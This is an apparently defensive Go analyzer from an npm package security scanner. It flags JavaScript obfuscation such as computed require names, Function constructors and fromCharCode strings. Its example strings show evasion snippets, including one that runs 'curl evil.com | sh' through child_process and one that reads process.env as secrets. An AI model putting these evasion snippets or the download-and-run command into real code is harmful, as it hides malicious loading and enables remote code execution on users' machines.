package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// ASTAnalyzer performs AST-like deep analysis of JavaScript code to detect
// obfuscation patterns that regex-only scanning misses. While not a full AST
// parser, it uses multi-pattern heuristics to detect:
// - Dynamic require/import with computed strings
// - String concatenation to build sensitive module names
// - Computed property access on dangerous modules
// - Function constructor abuse
// - Proxy-based require wrapping
type ASTAnalyzer struct{}

func NewASTAnalyzer() *ASTAnalyzer {
	return &ASTAnalyzer{}
}

func (a *ASTAnalyzer) Name() string {
	return "ast-analysis"
}

// Patterns for dynamic code construction.
var (
	// Dynamic require: require(variable) or require(expr)
	dynamicRequirePattern = regexp.MustCompile(`require\s*\(\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*\)`)

	// Computed property on require result: require('x')[variable]
	computedPropPattern = regexp.MustCompile(`\]\s*\(\s*['"]|require\s*\([^)]+\)\s*\[`)

	// String concatenation with + to build names (3+ pieces)
	stringConcatPattern = regexp.MustCompile(`['"][a-zA-Z_]{1,5}['"]\s*\+\s*['"][a-zA-Z_]{1,5}['"]\s*\+\s*['"][a-zA-Z_]{1,5}['"]`)

	// Array literal with string elements followed by join
	arrayLiteralPattern = regexp.MustCompile(`\[\s*['"][^'"]+['"]\s*(?:,\s*['"][^'"]+['"]\s*)+\]`)
	// .join() call
	joinCallPattern = regexp.MustCompile(`\.join\s*\(\s*['"]`)

	// globalThis / global / window - direct access or variable alias
	globalAssignPattern = regexp.MustCompile(`=\s*(?:globalThis|global|window)\s*(?:[;|&\n]|\|\||&&)`)
	globalDirectPattern = regexp.MustCompile(`(?:globalThis|global|window)\s*\[`)

	// new Proxy(require, ...) or Proxy(require, ...)
	proxyRequirePattern = regexp.MustCompile(`(?:new\s+)?Proxy\s*\(\s*require`)

	// new Function('...')
	functionConstructorPattern = regexp.MustCompile(`new\s+Function\s*\(`)

	// String.fromCharCode with multiple args
	fromCharCodePattern = regexp.MustCompile(`String\s*\.\s*fromCharCode\s*\(\s*\d+\s*(?:,\s*\d+\s*){2,}`)

	// Computed property access pattern: obj['ev' + 'al']
	computedMethodCallPattern = regexp.MustCompile(`\[\s*['"][a-zA-Z]{1,5}['"]\s*\+\s*['"][a-zA-Z]{1,5}['"]\s*\]`)
)

func (a *ASTAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	// Dynamic require detection
	if dynamicRequirePattern.MatchString(content) {
		// Check it's not just require('literal_string')
		// Also verify there's string building nearby
		if hasStringBuilding(content) {
			findings = append(findings, Finding{
				Analyzer:    a.Name(),
				Title:       "Dynamic require with computed module name",
				Description: fmt.Sprintf("File %q uses require() with a variable argument, combined with string construction. This hides the actual module being loaded.", filename),
				Severity:    SeverityHigh,
				ExploitExample: "Dynamic require hides malicious module loading from scanners:\n" +
					"    const name = 'child' + '_process';\n" +
					"    const cp = require(name);\n" +
					"    cp.exec('curl evil.com | sh');\n" +
					"    Scanners looking for require('child_process') won't detect this.",
				Remediation: "Investigate what module is being dynamically required. Legitimate use cases are rare.",
			})
		}
	}

	// String concatenation obfuscation
	if stringConcatPattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "String concatenation obfuscation detected",
			Description: fmt.Sprintf("File %q builds strings by concatenating multiple small pieces, a common technique to evade pattern matching.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "String concatenation hides dangerous identifiers:\n" +
				"    const a = 'ch' + 'il' + 'd_' + 'pr' + 'oc' + 'es' + 's';\n" +
				"    require(a).execSync('malicious command');\n" +
				"    Each piece is harmless; combined they form 'child_process'.",
			Remediation: "Manually reconstruct the concatenated strings to determine their actual values.",
		})
	}

	// Array join obfuscation - detect arrays of string literals + join call in same content
	if arrayLiteralPattern.MatchString(content) && joinCallPattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Array join obfuscation detected",
			Description: fmt.Sprintf("File %q uses array.join() to construct strings, potentially hiding module names or URLs.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Array join bypasses static analysis:\n" +
				"    const parts = ['child', '_', 'process'];\n" +
				"    require(parts.join('')).exec('whoami');\n" +
				"    The dangerous string is split across array elements.",
			Remediation: "Evaluate the array contents and join result to determine the constructed string.",
		})
	}

	// Computed property access
	if computedPropPattern.MatchString(content) || computedMethodCallPattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Computed property access on module",
			Description: fmt.Sprintf("File %q uses bracket notation to access module methods, which can hide function calls like exec or eval.", filename),
			Severity:    SeverityMedium,
			ExploitExample: "Computed properties hide dangerous method calls:\n" +
				"    const fn = 'ex' + 'ec';\n" +
				"    require('child_process')[fn]('whoami');\n" +
				"    Equivalent to .exec() but invisible to basic scanning.",
			Remediation: "Determine what property is being accessed. Computed access to process/child_process methods is suspicious.",
		})
	}

	// globalThis/global/window computed access (direct or via variable alias)
	if globalDirectPattern.MatchString(content) || globalAssignPattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Global scope computed access",
			Description: fmt.Sprintf("File %q accesses global scope with computed property names, potentially calling eval or require indirectly.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Global computed access hides eval calls:\n" +
				"    const g = globalThis;\n" +
				"    g['ev' + 'al'](malicious_code);\n" +
				"    This is equivalent to eval() but undetectable by regex.",
			Remediation: "Investigate what global function is being called via computed access.",
		})
	}

	// Proxy-based require wrapping
	if proxyRequirePattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Proxy-wrapped require detected",
			Description: fmt.Sprintf("File %q wraps require() in a Proxy, which can intercept and modify module loading behavior.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Proxy wrapping hides what modules are actually loaded:\n" +
				"    const p = new Proxy(require, {\n" +
				"      apply: (target, ctx, args) => target(args[0])\n" +
				"    });\n" +
				"    p('child_process'); // Invisible to scanners",
			Remediation: "Examine the Proxy handler to understand what interception is occurring.",
		})
	}

	// Function constructor
	if functionConstructorPattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Function constructor used",
			Description: fmt.Sprintf("File %q uses new Function() which is equivalent to eval() and can execute arbitrary code.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Function constructor is eval() in disguise:\n" +
				"    const fn = new Function('return process.env');\n" +
				"    const secrets = fn();\n" +
				"    This bypasses CSP and eval() detection.",
			Remediation: "new Function() should almost never be used in npm packages. Investigate the constructed function body.",
		})
	}

	// String.fromCharCode obfuscation
	if fromCharCodePattern.MatchString(content) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "String.fromCharCode obfuscation",
			Description: fmt.Sprintf("File %q uses String.fromCharCode() with multiple character codes to build strings, hiding their actual content.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Character code building hides string content:\n" +
				"    String.fromCharCode(101, 118, 97, 108) // 'eval'\n" +
				"    String.fromCharCode(114, 101, 113, 117, 105, 114, 101) // 'require'\n" +
				"    The numeric codes are opaque to text-based scanners.",
			Remediation: "Decode the character codes to determine the actual string being constructed.",
		})
	}

	return findings
}

// hasStringBuilding checks if code contains evidence of string construction
// near require calls.
func hasStringBuilding(content string) bool {
	indicators := []string{
		"+ '", "+ \"",
		"' +", "\" +",
		".join(",
		"fromCharCode",
		"String(",
		"Buffer.from(",
		"atob(",
	}
	for _, ind := range indicators {
		if strings.Contains(content, ind) {
			return true
		}
	}
	return false
}
